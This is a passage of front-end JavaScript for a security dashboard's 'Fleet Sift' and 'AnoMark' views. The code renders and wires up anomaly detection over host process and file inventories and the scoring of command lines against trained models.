            <div class="panel-head">
              <h3>Runs <span class="muted">${runs.length}</span></h3>
              <div class="toolbar">
                <button type="button" class="btn ghost tiny" id="btnSiftDeleteAll" ${runs.length ? "" : "disabled"} title="Delete all runs">Clear all</button>
              </div>
            </div>
            ${!runs.length ? `<div class="empty">No saved runs yet</div>` : `
            <ul class="ml-run-list">
              ${runs.map((r) => {
                const id = r.run_id || "";
                const active = id && id === activeRunId ? " is-active" : "";
                const when = r.created_at || (r.modified_unix ? new Date(Number(r.modified_unix) * 1000).toISOString() : "");
                const anom = Number(r.anomalies ?? 0);
                return `<li class="ml-run-item${active}">
                  <button type="button" class="ml-run-open" data-sift-open="${esc(id)}">
                    <span class="ml-run-when">${esc(fmtWhen(when))}</span>
                    <span class="ml-run-meta">
                      <span class="pill ${anom > 0 ? "warn" : "neutral"}">${esc(String(anom))} anom</span>
                      <span class="muted">${esc(r.mode || "process")} · ${esc(String(r.machines ?? "—"))} hosts</span>
                    </span>
                    <span class="mono muted ml-run-id">${esc(shortId(id))}${r.detection_config_name ? ` · ${esc(r.detection_config_name)}` : ""}</span>
                  </button>
                  <button type="button" class="icon-btn ml-run-del" data-sift-del="${esc(id)}" aria-label="Delete run" title="Delete">×</button>
                </li>`;
              }).join("")}
            </ul>`}
          </aside>
        </div>`;

    const tabBody = tab === "config"
      ? configPanel
      : tab === "results"
        ? resultsPanel
        : `<div class="ml-stack">${scopePanel}</div>`;

    return `
      <div class="ml-workspace">
        <header class="ml-hero panel">
          <div class="ml-hero-copy">
            <p class="ml-eyebrow">Fleet analytics</p>
            <h2>Fleet Sift</h2>
            <p class="muted">TF‑IDF + DBSCAN across the fleet — configure detection, scope hosts, then hunt outliers.</p>
          </div>
          <div class="ml-hero-actions">
            ${tab === "run" ? `
            <label class="ml-inline-label">Mode
              <select id="siftMode" class="ml-select">
                <option value="process" ${mode === "process" ? "selected" : ""}>Process</option>
                <option value="file" ${mode === "file" ? "selected" : ""}>File</option>
                <option value="both" ${mode === "both" ? "selected" : ""}>Both</option>
              </select>
            </label>
            <button type="button" class="btn primary" id="btnSiftRun" ${running ? "disabled" : ""}>${running ? "Running…" : "Run on fleet"}</button>` : ""}
            <button type="button" class="btn ghost" id="btnSiftRefresh">Refresh</button>
          </div>
        </header>

        ${siftProgressHtml()}

        ${mlSubTabsHtml([
          ["run", "Run", filtered.length || null],
          ["config", "Config"],
          ["results", "Results", last ? anomCount : (runs.length || null)],
        ], tab, "data-sift-tab")}

        ${tabBody}
      </div>`;
  }

  async function refreshSiftRuns() {
    try {
      const data = await api("/v1/sift/runs?limit=30");
      state._siftRuns = data.runs || [];
    } catch (err) {
      toast(err.message || "Failed to load sift runs");
    }
  }

  async function refreshSiftDetectionConfigs() {
    try {
      const data = await api("/v1/sift/detection-configs");
      state._siftConfig = data.config || siftConfigDefaults();
      state._siftProfiles = data.profiles || [];
      state._siftSelectedConfigId = data.selected_id || "";
      state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
    } catch (err) {
      try {
        const fallback = await api("/v1/sift/config");
        state._siftConfig = fallback.config || fallback;
        state._siftProfiles = fallback.profiles || [];
        state._siftSelectedConfigId = fallback.selected_id || "";
        state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
      } catch (e2) {
        toast(err.message || "Failed to load detection configs");
      }
    }
  }

  function startSiftProgress(hostCount, meta = {}) {
    const inv = meta.inventory || siftInventoryIndex();
    const mode = meta.mode || state._siftMode || "process";
    const filters = [
      meta.env ? `env=${meta.env}` : "",
      meta.kind ? `kind=${meta.kind}` : "",
      meta.q ? `q=${meta.q}` : "",
    ].filter(Boolean).join(" · ") || "none";
    const phases = [
      { id: "scope", label: "Scope hosts", detail: `Matching ${hostCount} host(s) · filters: ${filters}`, pct: 12 },
      { id: "extract", label: "Extract inventory", detail: `Loading ${mode} rows from scan #${inv}…`, pct: 38 },
      { id: "cluster", label: "TF-IDF + DBSCAN", detail: "Building profiles and clustering…", pct: 68 },
      { id: "findings", label: "Score anomalies", detail: "Ranking outliers and writing run…", pct: 88 },
    ];
    let idx = 0;
    const apply = () => {
      const p = phases[idx];
      const prevDebug = state._siftProgress?.debug || [
        { ts: mlDebugNow(), msg: `Start · ${hostCount} host(s) · mode=${mode} · inventory=#${inv}` },
        { ts: mlDebugNow(), msg: `Filters: ${filters}` },
      ];
      state._siftProgress = {
        title: "Fleet Sift running",
        phase: p.label,
        detail: p.detail,
        pct: p.pct,
        indeterminate: idx < phases.length - 1,
        steps: phases.map((ph, i) => ({
          label: ph.label,
          status: i < idx ? "done" : i === idx ? "active" : "pending",
        })),
        debug: prevDebug,
      };
      if (state.view === "fleet-sift") render();
    };
    apply();
    const timer = window.setInterval(() => {
      idx = Math.min(idx + 1, phases.length - 1);
      mlPushDebug("_siftProgress", phases[idx].detail);
      apply();
      if (idx >= phases.length - 1) window.clearInterval(timer);
    }, 900);
    state._siftProgressTimer = timer;
    return () => {
      if (state._siftProgressTimer) window.clearInterval(state._siftProgressTimer);
      state._siftProgressTimer = null;
    };
  }

  function finishSiftProgress(detail) {
    if (state._siftProgressTimer) {
      window.clearInterval(state._siftProgressTimer);
      state._siftProgressTimer = null;
    }
    const debug = [...(state._siftProgress?.debug || []), { ts: mlDebugNow(), msg: detail || "Done" }];
    state._siftProgress = {
      title: "Fleet Sift complete",
      phase: "Done",
      detail: detail || "Finished",
      pct: 100,
      indeterminate: false,
      debug,
      steps: [
        { label: "Scope hosts", status: "done" },
        { label: "Extract inventory", status: "done" },
        { label: "TF-IDF + DBSCAN", status: "done" },
        { label: "Score anomalies", status: "done" },
      ],
    };
  }

  function clearSiftProgressSoon() {
    window.setTimeout(() => {
      state._siftProgress = null;
      if (state.view === "fleet-sift") render();
    }, 2800);
  }

  function buildSiftRunBody() {
    const mode = $("#siftMode")?.value || state._siftMode || "process";
    state._siftMode = mode;
    const config = readSiftConfigFromForm();
    const selected = [...siftSelectedHostIds()];
    const filtered = siftFilteredHosts();
    const body = { mode, config };
    // Prefer explicit selection; otherwise scope to the filtered host list.
    if (selected.length) body.host_ids = selected;
    else if (filtered.length && filtered.length < (state.hosts || []).length) {
      body.host_ids = filtered.map((h) => h.id);
    }
    const env = String(state._siftEnv || "").trim();
    if (env) body.labels = { ...(body.labels || {}), env };
    const after = String(state._siftScanAfter || "").trim();
    const before = String(state._siftScanBefore || "").trim();
    if (after) body.scan_after = new Date(after).toISOString();
    if (before) body.scan_before = new Date(before).toISOString();
    const invRaw = String(state._siftInventory || $("#siftInventory")?.value || "1").trim();
    state._siftInventory = invRaw;
    const invN = siftInventoryIndex();
    state._siftInventory = String(invN);
    body.inventory = String(invN);
    const profileId = $("#siftProfileSelect")?.value || state._siftSelectedConfigId || "";
    if (profileId) {
      body.detection_config_id = profileId;
      state._siftSelectedConfigId = profileId;
    }
    return body;
  }

  function wireFleetSift() {
    wireMlSubTabs("data-sift-tab", "_siftTab", ["run", "config", "results"]);

    const modeSel = $("#siftMode");
    if (modeSel) {
      modeSel.addEventListener("change", () => {
        state._siftMode = modeSel.value || "process";
      });
    }

    const bindSelect = (id, key) => {
      const el = document.getElementById(id);
      if (!el) return;
      el.addEventListener("change", () => {
        state[key] = el.value;
        render();
      });
    };
    bindSelect("siftEnv", "_siftEnv");
    bindSelect("siftKind", "_siftKind");
    bindSelect("siftInventory", "_siftInventory");
    bindSelect("siftScanAfter", "_siftScanAfter");
    bindSelect("siftScanBefore", "_siftScanBefore");
    bindSelect("siftResultSev", "_siftResultSev");

    const siftQ = $("#siftHostQ");
    if (siftQ) {
      const applySiftQ = () => {
        const live = $("#siftHostQ");
        if (live) state._siftHostQ = live.value || "";
        // Drop legacy separate tag filter into the unified search.
        if (state._siftTag) {
          const t = String(state._siftTag).trim();
          if (t && !String(state._siftHostQ || "").includes(t)) {
            state._siftHostQ = `${String(state._siftHostQ || "").trim()} ${t}`.trim();
          }
          state._siftTag = "";
        }
        const start = live?.selectionStart;
        const end = live?.selectionEnd;
        render();
        const el = $("#siftHostQ");
        if (el) {
          el.focus();
          try {
            if (start != null) el.setSelectionRange(start, end);
          } catch (_) {}
        }
      };
      siftQ.addEventListener("input", () => {
        state._siftHostQ = siftQ.value || "";
        clearTimeout(_siftFilterTimer);
        _siftFilterTimer = window.setTimeout(applySiftQ, 140);
      });
      siftQ.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          clearTimeout(_siftFilterTimer);
          applySiftQ();
        }
      });
    }

    const resultQ = $("#siftResultQ");
    if (resultQ) {
      resultQ.addEventListener("input", () => {
        state._siftResultQ = resultQ.value || "";
        clearTimeout(_siftResultFilterTimer);
        _siftResultFilterTimer = window.setTimeout(() => {
          const live = $("#siftResultQ");
          if (live) state._siftResultQ = live.value || "";
          render();
          const el = $("#siftResultQ");
          if (el) el.focus();
        }, 140);
      });
    }

    $$("[data-sift-result-tab]").forEach((btn) => {
      btn.addEventListener("click", () => {
        if (btn.disabled) return;
        state._siftResultTab = btn.getAttribute("data-sift-result-tab") || "all";
        render();
      });
    });

    $$("[data-sift-anom]").forEach((card) => {
      const open = () => {
        const idx = Number(card.getAttribute("data-sift-anom"));
        const row = (state._siftResultRows || [])[idx];
        if (!row) return;
        const mid = row.machine_id || "";
        const sources = state._siftResultSources || state._siftLast?.sources || [];
        const hostLabel = (() => {
          const src = sources.find((s) => s.host_id === mid || s.display_name === mid);
          if (src?.display_name) return src.display_name;
          return state.hostById?.[mid]?.display_name || mid;
        })();
        showSiftAnomalyDetail(row, hostLabel, sources);
      };
      card.addEventListener("click", open);
      card.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          open();
        }
      });
    });

    $$(".sift-host-cb").forEach((cb) => {
      cb.addEventListener("change", () => {
        const set = siftSelectedHostIds();
        if (cb.checked) set.add(cb.value);
        else set.delete(cb.value);
        render();
      });
    });

    const selVis = $("#siftSelectVisible");
    if (selVis) {
      selVis.addEventListener("click", () => {
        const set = siftSelectedHostIds();
        const rows = siftFilteredHosts();
        const allOn = rows.length > 0 && rows.every((h) => set.has(h.id));
        if (allOn) rows.forEach((h) => set.delete(h.id));
        else rows.forEach((h) => set.add(h.id));
        render();
      });
    }
    const clearHosts = $("#siftClearHosts");
    if (clearHosts) {
      clearHosts.addEventListener("click", () => {
        state._siftSelectedHosts = new Set();
        render();
      });
    }

    const btnRun = $("#btnSiftRun");
    if (btnRun) {
      btnRun.addEventListener("click", async () => {
        btnRun.disabled = true;
        const body = buildSiftRunBody();
        const hostCount = body.host_ids?.length || siftFilteredHosts().length || (state.hosts || []).length;
        const t0 = performance.now();
        const stop = startSiftProgress(hostCount, {
          inventory: body.inventory,
          mode: body.mode,
          env: state._siftEnv,
          kind: state._siftKind,
          q: state._siftHostQ,
        });
        try {
          const res = await api("/v1/sift/runs", { method: "POST", body });
          stop();
          const elapsed_ms = Math.round(performance.now() - t0);
          const sources = res.sources || [];
          const procRows = sources.reduce((n, s) => n + Number(s.process_rows || 0), 0);
          const fileRows = sources.reduce((n, s) => n + Number(s.file_rows || 0), 0);
          state._siftLastDebug = {
            inventory: body.inventory,
            mode: body.mode,
            host_count: hostCount,
            config_name: res.detection_config_name,
            filters: [
              state._siftEnv ? `env=${state._siftEnv}` : "",
              state._siftKind ? `kind=${state._siftKind}` : "",
              state._siftHostQ ? `q=${state._siftHostQ}` : "",
            ].filter(Boolean).join(" · ") || "none",
            elapsed_ms,
          };
          state._siftLast = { ...res, _debug: state._siftLastDebug };
          state._siftTab = "results";
          state._siftResultTab = null;
          state._siftResultQ = "";
          state._siftResultSev = "";
          finishSiftProgress(
            `${res.machines || 0} machines · ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"} · ${procRows}p/${fileRows}f rows · ${elapsed_ms}ms · config ${res.detection_config_name || "inline"}`
          );
          await refreshSiftRuns();
          toast(`Sift complete — ${res.anomalies || 0} anomal${(res.anomalies || 0) === 1 ? "y" : "ies"} in ${elapsed_ms}ms`);
          render();
          clearSiftProgressSoon();
        } catch (err) {
          stop();
          state._siftProgress = null;
          toast(err.message || "Fleet sift failed");
          render();
        } finally {
          btnRun.disabled = false;
        }
      });
    }

    const btnRef = $("#btnSiftRefresh");
    if (btnRef) {
      btnRef.addEventListener("click", async () => {
        await Promise.all([refreshSiftRuns(), refreshSiftDetectionConfigs()]);
        render();
      });
    }

    $$("[data-sift-open]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const id = btn.getAttribute("data-sift-open");
        try {
          const run = await api(`/v1/sift/runs/${encodeURIComponent(id)}`);
          state._siftLast = {
            run_id: run.run_id || id,
            machines: run.machines,
            anomalies: run.anomalies,
            mode: run.mode,
            report: run.report,
            file_report: run.file_report,
            sources: run.sources || [],
            detection_config_id: run.detection_config_id,
            detection_config_name: run.detection_config_name,
            created_at: run.created_at,
            modified_unix: run.modified_unix,
          };
          state._siftResultTab = null;
          state._siftResultQ = "";
          state._siftResultSev = "";
          state._siftTab = "results";
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    });

    $$("[data-sift-del]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const id = btn.getAttribute("data-sift-del");
        if (!id) return;
        if (!window.confirm(`Delete sift run ${id.slice(0, 8)}…?`)) return;
        try {
          await api(`/v1/sift/runs/${encodeURIComponent(id)}`, { method: "DELETE" });
          if (state._siftLast?.run_id === id) state._siftLast = null;
          await refreshSiftRuns();
          toast("Run deleted");
          render();
        } catch (err) {
          toast(err.message || "Delete failed");
        }
      });
    });

    const btnDelAll = $("#btnSiftDeleteAll");
    if (btnDelAll) {
      btnDelAll.addEventListener("click", async () => {
        if (!window.confirm("Delete all Fleet Sift runs? This cannot be undone.")) return;
        try {
          const res = await api("/v1/sift/runs", { method: "DELETE" });
          state._siftLast = null;
          await refreshSiftRuns();
          toast(`Deleted ${res.deleted ?? 0} run(s)`);
          render();
        } catch (err) {
          toast(err.message || "Clear failed");
        }
      });
    }

    const useProf = $("#siftCfgUseProfile");
    if (useProf) {
      useProf.addEventListener("click", async () => {
        const id = $("#siftProfileSelect")?.value;
        if (!id) {
          toast("Pick a saved profile first");
          return;
        }
        try {
          const res = await api(`/v1/sift/detection-configs/${encodeURIComponent(id)}/select`, {
            method: "POST",
            body: {},
          });
          state._siftSelectedConfigId = id;
          state._siftConfig = res.config || state._siftConfig;
          state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
          await refreshSiftDetectionConfigs();
          toast("Profile selected");
          render();
        } catch (err) {
          toast(err.message || "Select failed");
        }
      });
    }

    const profSel = $("#siftProfileSelect");
    if (profSel) {
      profSel.addEventListener("change", async () => {
        const id = profSel.value;
        state._siftSelectedConfigId = id || "";
        if (!id) return;
        try {
          const detail = await api(`/v1/sift/detection-configs/${encodeURIComponent(id)}`);
          if (detail.config) {
            state._siftConfig = detail.config;
            state._siftConfigRaw = JSON.stringify(detail.config, null, 2);
            render();
          }
        } catch (err) {
          toast(err.message || "Failed to load profile");
        }
      });
    }

    const saveActive = $("#siftCfgSaveActive");
    if (saveActive) {
      saveActive.addEventListener("click", async () => {
        const config = readSiftConfigFromForm();
        try {
          if (state._siftSelectedConfigId) {
            await api(`/v1/sift/detection-configs/${encodeURIComponent(state._siftSelectedConfigId)}`, {
              method: "PUT",
              body: { config },
            });
            toast("Profile updated");
          } else {
            await api("/v1/sift/detection-configs/active", { method: "PUT", body: config });
            toast("Active config saved");
          }
          await refreshSiftDetectionConfigs();
          render();
        } catch (err) {
          toast(err.message || "Save failed");
        }
      });
    }

    const saveAs = $("#siftCfgSaveAs");
    if (saveAs) {
      saveAs.addEventListener("click", async () => {
        const name = window.prompt("Profile name");
        if (!name || !name.trim()) return;
        const config = readSiftConfigFromForm();
        try {
          const res = await api("/v1/sift/detection-configs", {
            method: "POST",
            body: { name: name.trim(), config },
          });
          const id = res.id;
          if (id) {
            await api(`/v1/sift/detection-configs/${encodeURIComponent(id)}/select`, {
              method: "POST",
              body: {},
            });
          }
          await refreshSiftDetectionConfigs();
          toast(`Saved profile “${name.trim()}”`);
          render();
        } catch (err) {
          toast(err.message || "Save as failed");
        }
      });
    }

    const delProf = $("#siftCfgDelete");
    if (delProf) {
      delProf.addEventListener("click", async () => {
        const id = state._siftSelectedConfigId || $("#siftProfileSelect")?.value;
        if (!id) return;
        if (!window.confirm("Delete this detection profile?")) return;
        try {
          await api(`/v1/sift/detection-configs/${encodeURIComponent(id)}`, { method: "DELETE" });
          state._siftSelectedConfigId = "";
          await refreshSiftDetectionConfigs();
          toast("Profile deleted");
          render();
        } catch (err) {
          toast(err.message || "Delete failed");
        }
      });
    }

    const resetCfg = $("#siftCfgReset");
    if (resetCfg) {
      resetCfg.addEventListener("click", () => {
        state._siftConfig = siftConfigDefaults();
        state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
        render();
      });
    }

    const applyRaw = $("#siftCfgApplyRaw");
    if (applyRaw) {
      applyRaw.addEventListener("click", () => {
        const raw = $("#siftCfgRaw")?.value || "{}";
        try {
          state._siftConfig = { ...siftConfigDefaults(), ...JSON.parse(raw) };
          state._siftConfigRaw = JSON.stringify(state._siftConfig, null, 2);
          toast("JSON applied");
          render();
        } catch (err) {
          toast(err.message || "Invalid JSON");
        }
      });
    }

    $$("[data-copy-ingest]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const tok = btn.getAttribute("data-copy-ingest") || "";
        try {
          await navigator.clipboard.writeText(tok);
          toast(tok ? "Ingest token copied" : "No ingest token");
        } catch (_) {
          toast(tok || "No token");
        }
      });
    });
  }

  async function refreshAnoMark() {
    const [modelsRes, avail] = await Promise.all([
      api("/v1/anomark/models"),
      api("/v1/anomark/availability").catch(() => null),
    ]);
    state._anomarkModels = modelsRes.models || [];
    state._anomarkAvail = avail;
    if (!state._anomarkSelectedModel && state._anomarkModels.length) {
      const fav = state._anomarkModels.find((m) => m.favorite);
      state._anomarkSelectedModel = (fav || state._anomarkModels[0]).id;
    }
  }

  function anomarkInventoryKeep() {
    return Math.max(
      1,
      Math.min(50, Number(state.settings?.effective?.scan_history_per_host ?? 3) || 3)
    );
  }

  function anomarkInventorySelectHtml(id, name, selected) {
    const keep = anomarkInventoryKeep();
    let cur = parseInt(String(selected || "1"), 10);
    if (!Number.isFinite(cur) || cur < 1) cur = 1;
    cur = Math.min(cur, keep);
    const opts = [];
    for (let n = 1; n <= keep; n++) {
      const label = n === 1 ? "1 — latest" : n === 2 ? "2 — previous" : String(n);
      opts.push(`<option value="${n}" ${cur === n ? "selected" : ""}>${esc(label)}</option>`);
    }
    const nameAttr = name ? ` name="${esc(name)}"` : "";
    const idAttr = id ? ` id="${esc(id)}"` : "";
    return `<select${idAttr}${nameAttr} class="ml-select" title="Nth newest finished scan (1 = latest)">${opts.join("")}</select>`;
  }

  function anomarkFilteredHosts(opts = {}) {
    const q = String(opts.q ?? state._anomarkHostQ ?? "").trim().toLowerCase();
    const tokens = q ? q.split(/\s+/).filter(Boolean) : [];
    const env = String(opts.env ?? state._anomarkHostEnv ?? "").trim();
    const kind = String(opts.kind ?? state._anomarkHostKind ?? "").trim().toLowerCase();
    const tag = String(opts.tag ?? state._anomarkHostTag ?? "").trim().toLowerCase();
    const out = [];
    for (const h of state.hosts || []) {
      if (kind === "agentlite") {
        if (!isAgentLiteHost(h)) continue;
      } else if (kind === "ssh") {
        if (isAgentLiteHost(h) || isVirtualHost(h)) continue;
      } else if (kind && String(h.agent_kind || "ssh").toLowerCase() !== kind) continue;
      if (env && (h.labels?.env || "") !== env) continue;
      if (tag) {
        const tags = fleetSiftHostTags(h).join(" ").toLowerCase();
        if (!tags.includes(tag)) continue;
      }
      if (tokens.length) {
        const hay = siftHostSearchHay(h);
        if (!tokens.every((t) => hay.includes(t))) continue;
      }
      out.push(h);
    }
    out.sort((a, b) => String(a.display_name || "").localeCompare(String(b.display_name || "")));
    return out;
  }

  function anomarkHostFilterBarHtml(prefix) {
    const p = prefix || "anomark";
    const envs = [...new Set((state.hosts || []).map((h) => h.labels?.env).filter(Boolean))].sort();
    const tags = siftKnownTags();
    const qKey = `_${p}HostQ`;
    const envKey = `_${p}HostEnv`;
    const kindKey = `_${p}HostKind`;
    const tagKey = `_${p}HostTag`;
    return `<div class="anomark-host-filters sift-scope-filters">
      <label class="sift-filter-search">Search
        <input type="search" id="${esc(p)}HostQ" list="${esc(p)}TagList" placeholder="Name, IP, or tag…" value="${esc(state[qKey] || "")}" autocomplete="off" />
        <datalist id="${esc(p)}TagList">${tags.map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
      </label>
      <label>Tag
        <input type="search" id="${esc(p)}HostTag" list="${esc(p)}TagList2" placeholder="prod…" value="${esc(state[tagKey] || "")}" autocomplete="off" />
        <datalist id="${esc(p)}TagList2">${tags.map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
      </label>
      <label>Env
        <select id="${esc(p)}HostEnv">
          <option value="">All envs</option>
          ${envs.map((e) => `<option value="${esc(e)}" ${state[envKey] === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
        </select>
      </label>
      <label>Kind
        <select id="${esc(p)}HostKind">
          <option value="">All kinds</option>
          <option value="ssh" ${state[kindKey] === "ssh" ? "selected" : ""}>SSH</option>
          <option value="agentlite" ${state[kindKey] === "agentlite" ? "selected" : ""}>AgentLite</option>
          <option value="virtual" ${state[kindKey] === "virtual" ? "selected" : ""}>Virtual</option>
        </select>
      </label>
    </div>`;
  }

  function anomarkHostOptions(selectedIds, cbClass, filterPrefix) {
    const cls = cbClass || "anomark-host-cb";
    const prefix = filterPrefix || "anomark";
    const sel = new Set(selectedIds || []);
    const hosts = anomarkFilteredHosts({
      q: state[`_${prefix}HostQ`],
      env: state[`_${prefix}HostEnv`],
      kind: state[`_${prefix}HostKind`],
      tag: state[`_${prefix}HostTag`],
    });
    if (!(state.hosts || []).length) return `<div class="empty">No hosts yet</div>`;
    return `${anomarkHostFilterBarHtml(prefix)}
      <div class="anomark-host-list ml-host-picks">
      ${!hosts.length ? `<div class="empty">No hosts match filters</div>` : hosts.map((h) => {
        const id = h.id || "";
        const checked = sel.has(id) ? "checked" : "";
        const kind = (h.agent_kind || "ssh").toLowerCase();
        const tags = fleetSiftHostTags(h).slice(0, 3).join(", ");
        return `<label class="ml-host-pick">
          <input type="checkbox" class="${esc(cls)}" value="${esc(id)}" ${checked} />
          <span><strong>${esc(h.display_name || id)}</strong>
            <span class="muted mono"> · ${esc(kind)}</span>
            ${tags ? `<span class="muted"> · ${esc(tags)}</span>` : ""}
          </span>
        </label>`;
      }).join("")}
      </div>
      <div class="muted ml-foot-note" style="margin-top:0.35rem">${hosts.length} shown · ${sel.size ? `${sel.size} selected` : "none selected"}</div>`;
  }

  function anomark() {
    const models = state._anomarkModels || [];
    const avail = state._anomarkAvail || {};
    const selected = state._anomarkSelectedModel || "";
    const last = state._anomarkLastApply || null;
    const score = state._anomarkScore || null;
    const selectedModel = models.find((m) => m.id === selected) || null;
    const readyCount = models.filter((m) => m.available !== false).length;
    const tab = ["models", "score", "try"].includes(state._anomarkTab)
      ? state._anomarkTab
      : "models";
    state._anomarkTab = tab;
    const suspectTotal = last ? Number(last.total_suspects ?? 0) : 0;

    const modelsPanel = `
          ${state._anomarkLastTrain ? `
          <div class="ml-train-banner">
            <div class="ml-train-banner-head">
              <strong>Last training succeeded</strong>
              <span class="muted mono">${esc(fmtWhen(state._anomarkLastTrain.record?.created_at))} · ${state._anomarkLastTrain._elapsed_ms != null ? `${esc(String(state._anomarkLastTrain._elapsed_ms))} ms` : ""}</span>
            </div>
            ${anomarkModelDetailHtml(
              models.find((x) => x.id === (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id)) || state._anomarkLastTrain.record,
              state._anomarkInspect?.id === (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id)
                ? state._anomarkInspect
                : null,
              state._anomarkLastTrain
            )}
          </div>` : ""}
          <section class="panel ml-card">
            <div class="panel-head">
              <h3>Models</h3>
              <span class="muted">${models.length ? "Click a card to select" : "None yet"}</span>
            </div>
            ${!models.length ? `<div class="empty ml-empty-hero">No models yet — train from host inventories or paste command lines</div>` : `
            <div class="ml-model-list">
              ${models.map((m) => {
                const active = m.id === selected ? " is-selected" : "";
                const order = m.request?.order ?? "—";
                const lines = m.training_line_count ?? "—";
                const col = m.request?.column || "cmdline";
                return `<article class="ml-model-card${active}" data-anomark-pick="${esc(m.id)}" tabindex="0" role="button">
                  <div class="ml-model-card-top">
                    <strong>${m.favorite ? "★ " : ""}${esc(m.name || m.id)}</strong>
                    <span class="mono muted">${esc(shortId(m.id))}</span>
                  </div>
                  <div class="ml-model-card-meta">
                    <span>${esc(String(lines))} lines</span>
                    <span>order ${esc(String(order))}</span>
                    <span class="mono muted">${esc(col)}</span>
                    <span class="muted">${esc(fmtTime(m.created_at))}</span>
                  </div>
                  <div class="ml-model-card-actions">
                    <button type="button" class="btn ghost tiny" data-anomark-inspect="${esc(m.id)}">Inspect</button>
                    <button type="button" class="btn ghost tiny" data-anomark-fav="${esc(m.id)}" data-fav="${m.favorite ? "0" : "1"}">${m.favorite ? "Unstar" : "Star"}</button>
                    <button type="button" class="btn ghost tiny" data-anomark-del="${esc(m.id)}">Delete</button>
                  </div>
                </article>`;
              }).join("")}
            </div>`}
          </section>
          ${selectedModel && (!state._anomarkLastTrain || selectedModel.id !== (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id))
            ? anomarkModelDetailHtml(
              selectedModel,
              state._anomarkInspect?.id === selectedModel.id ? state._anomarkInspect : null,
              null
            )
            : ""}`;

    const scoreHostsPanel = `
          <section class="panel ml-card">
            <div class="panel-head"><h3>Score hosts</h3>
              <span class="muted">${esc(selectedModel?.name || "platform default")}</span>
            </div>
            <div class="ml-panel-body stack">
              <div class="ml-apply-bar">
                <label>Model
                  <select id="anomarkApplyModel">
                    <option value="">Platform default</option>
                    ${models.map((m) => `<option value="${esc(m.id)}" ${m.id === selected ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
                  </select>
                </label>
                <label>Inventory scan #
                  ${anomarkInventorySelectHtml("anomarkApplyInventory", null, state._anomarkApplyInventory || "1")}
                </label>
                <label>Suspect %
                  <input type="number" id="anomarkApplySuspect" min="50" max="99.9" step="0.1" value="95" style="width:5rem" />
                </label>
                <button type="button" class="btn primary" id="btnAnoMarkApply">Score selected</button>
                <button type="button" class="btn ghost" id="btnAnoMarkSelectAll">Select visible</button>
                <button type="button" class="btn ghost" id="btnAnoMarkSelectNone">Clear</button>
              </div>
              ${anomarkHostOptions(state._anomarkHostSel || [], "anomark-host-cb", "anomark")}
              ${last ? `
                <div class="ml-anomark-results">
                  <div class="stats ml-kpi-row">
                    <div class="stat"><div class="label">Scored</div><div class="value">${esc(String(last.total_scored ?? 0))}</div></div>
                    <div class="stat crit"><div class="label">Suspects</div><div class="value">${esc(String(last.total_suspects ?? 0))}</div></div>
                    <div class="stat"><div class="label">Hosts</div><div class="value">${esc(String((last.hosts || []).length))}</div></div>
                    ${last.inventory ? `<div class="stat"><div class="label">Scan #</div><div class="value">${esc(String(last.inventory))}</div></div>` : ""}
                    ${last._elapsed_ms != null ? `<div class="stat"><div class="label">Elapsed</div><div class="value" style="font-size:0.9rem">${esc(String(last._elapsed_ms))} ms</div></div>` : ""}
                  </div>
                  <details class="ml-details ml-debug-panel" open>
                    <summary>Apply debug</summary>
                    <div class="ml-debug-grid">
                      <div><dt>Model</dt><dd class="mono">${esc(last.model_id || "platform default")}</dd></div>
                      <div><dt>Suspect %</dt><dd class="mono">${esc(String(last.suspect_percent ?? "—"))}</dd></div>
                      <div><dt>Inventory</dt><dd class="mono">#${esc(String(last.inventory ?? "1"))}</dd></div>
                      <div><dt>Hosts requested</dt><dd class="mono">${esc(String(last._host_count ?? (last.hosts || []).length))}</dd></div>
                    </div>
                    ${last._debug?.length ? `<ul class="ml-debug-log">${last._debug.map((d) => `
                      <li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>
                    `).join("")}</ul>` : ""}
                  </details>
                  ${(last.hosts || []).map((h) => `
                    <details class="ml-details" ${(h.suspects || 0) > 0 ? "open" : ""}>
                      <summary><strong>${esc(h.display_name)}</strong>
                        <span class="muted"> — ${esc(String(h.suspects))}/${esc(String(h.scored))} suspect</span>
                      </summary>
                      ${!(h.sample || []).length ? `<div class="empty">No sample suspects</div>` : `
                      <div class="ml-table-scroll">
                        <table class="data"><thead><tr><th>Command</th><th>ln L</th><th>Margin</th></tr></thead><tbody>
                          ${(h.sample || []).map((s) => `<tr>
                            <td class="mono ml-cmd-cell">${esc(s.command || "")}</td>
                            <td class="mono">${esc(String(s.log_likelihood ?? "—"))}</td>
                            <td class="mono">${esc(String(s.margin_ln ?? "—"))}</td>
                          </tr>`).join("")}
                        </tbody></table>
                      </div>`}
                    </details>`).join("")}
                </div>` : `<p class="muted" style="margin:0.75rem 0 0;font-size:0.85rem">Select hosts and score to see suspects here.</p>`}
            </div>
          </section>`;

    const tryCmd = state._anomarkTryCmd ?? "";
    const tryMachine = state._anomarkTryMachine ?? "";
    const tryPct = state._anomarkTryPct ?? 95;
    const tryHistory = state._anomarkTryHistory || [];
    const scoreBatch = score?.batch ? score : null;
    const scoreSingle = score && !score.batch ? score : null;

    const tryPanel = `
          <section class="panel ml-card">
            <div class="panel-head"><h3>Try a command</h3></div>
            <form class="form ml-panel-body" id="anomarkScoreForm">
              <p class="muted" style="font-size:0.82rem;margin:0 0 0.65rem">
                Score one or more command lines against a trained model. One command per line for batch try.
              </p>
              <label>Command(s)
